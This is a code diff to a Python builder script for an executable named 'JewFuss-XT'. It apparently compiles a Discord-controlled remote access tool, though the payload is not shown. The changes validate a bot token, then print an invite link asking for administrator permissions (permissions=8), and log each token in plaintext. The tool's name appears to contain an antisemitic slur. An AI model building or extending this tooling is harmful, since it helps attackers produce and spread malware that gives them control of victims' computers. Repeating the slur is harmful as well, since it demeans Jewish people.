@@ -75,9 +75,13 @@ while True:
     
     if user_input:
         print("Checking if token is valid...")
-        if requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": f"Bot {user_input}"}).status_code != 200: # 200 is valid, 401 is invalid, 429 is ratelimited
+        response = requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": f"Bot {user_input}"})
+        if response.status_code != 200: # 200 is valid, 401 is invalid, 429 is ratelimited
             print("Error: invalid bot token")
             invalidtoken = True
+        else:
+            bot_username = response.json()["username"] + "#" + response.json()["discriminator"]
+            bot_id = response.json()["id"]
         if invalidtoken == False:
             user_input = f'TOKEN = "{user_input}"'
             break
@@ -107,7 +111,7 @@ if os.path.exists(output_path):
     new_name = f"{timestamp}-JewFuss-XT.exe"
     new_path = os.path.join(output_dir, new_name)
     os.rename(output_path, new_path)
-    print(f"\nRenaming {os.path.basename(output_path)} to {new_name}\n")
+    print(f"Renaming {os.path.basename(output_path)} to {new_name}\n")
 elif not os.path.exists(output_dir):
     os.makedirs(output_dir)
 
@@ -133,7 +137,12 @@ if "icon" in locals():
 
 subprocess.run(cmd)
 shutil.rmtree(temp_dir)
-os.system(f'explorer /select,"{output_dir}\JewFuss-XT.exe"')
 
-with open(log_file_path, 'a') as log_file:
-    log_file.write(f"\"{timestamp}\": {user_input}\n")
+if os.path.isfile(output_path):
+    os.system(f'explorer /select,"{output_dir}\JewFuss-XT.exe"')    
+    print(f"\nCompiled JewFuss-XT as {bot_username}")
+    print(f"Bot invite link: https://discord.com/oauth2/authorize?client_id={bot_id}&permissions=8&scope=bot")
+    with open(log_file_path, 'a') as log_file:
+        log_file.write(f"\"{timestamp}\": {user_input} ({bot_username})\n")
+else:
+    print("Error: JewFuss-XT was unable to compile")
